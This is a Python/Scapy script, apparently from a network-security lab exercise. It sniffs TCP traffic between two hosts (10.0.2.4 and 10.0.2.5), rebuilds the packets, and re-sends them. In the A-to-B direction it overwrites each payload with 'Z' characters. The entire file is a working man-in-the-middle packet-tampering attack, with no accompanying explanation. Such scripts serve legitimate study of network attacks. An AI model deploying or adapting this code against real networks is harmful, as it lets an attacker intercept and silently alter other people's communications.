from scapy.all import *

def spoof_pkt(pkt):
	if pkt[IP].src == '10.0.2.4' and pkt[IP].dst == '10.0.2.5':	# Packet from A to B
		newpkt = IP(bytes(pkt[IP]))	# Create new packet from received packet

		del(newpkt.chksum)		# Delete checksums and payload
		del(newpkt[TCP].payload)	# Scapy will regenerate correct checksum
		del(newpkt[TCP].chksum)

		if pkt[TCP].payload:		# If packet has payload
			data = pkt[TCP].payload.load	# Get data

			newdata = 'Z' * len(data)	# Replace data with Zs 

			# print(data.decode(), '->', newdata)	# Print data to console

			send(newpkt/str.encode(newdata), verbose=0)	# Send packet with new data
		else:	# If packet doesnt have payload, forward normally

			send(newpkt, verbose=0)

	elif pkt[IP].src == '10.0.2.5' and pkt[IP].dst == '10.0.2.4':	# Packet from B to A
		newpkt = IP(bytes(pkt[IP]))	# Create new packet from received packet

		del(newpkt.chksum)		# Detele checksums, scapy will regen them
		del(newpkt[TCP].chksum)
	
		send(newpkt, verbose=0)		# Forward packet


# Sniff on ethernet interface
pkt = sniff(iface='enp0s3', filter='tcp and host 10.0.2.4', prn=spoof_pkt)
